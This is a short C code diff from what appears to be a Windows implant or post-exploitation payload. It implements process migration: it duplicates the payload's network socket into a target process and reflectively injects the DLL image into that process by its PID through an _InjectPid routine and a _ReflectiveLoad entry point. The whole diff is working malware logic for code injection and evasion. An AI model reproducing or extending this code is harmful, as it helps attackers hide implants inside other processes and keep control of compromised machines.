@@ -12,6 +12,7 @@ void Next(uint32_t pid)
         return;
     
     // set up *DllMeta.net.info
+    WSADuplicateSocket(DllMeta.net.sock, pid, &DllMeta.net.info);
 }
 
 void Migrate()
@@ -19,5 +20,5 @@ void Migrate()
     if(!DllMeta.next.pid || DllMeta.next.pid == (uint64_t)GetCurrentProcess())
         return;
     
-    _InjectPid(DllMeta.where, DllMeta.size, offset_to_rva(DllMeta.where, &_ReflectiveLoad), DllMeta.next.pid);
+    _InjectPid(DllMeta.curr.where, DllMeta.curr.size, offset_to_rva(DllMeta.curr.where, &_ReflectiveLoad), DllMeta.next.pid);
 }
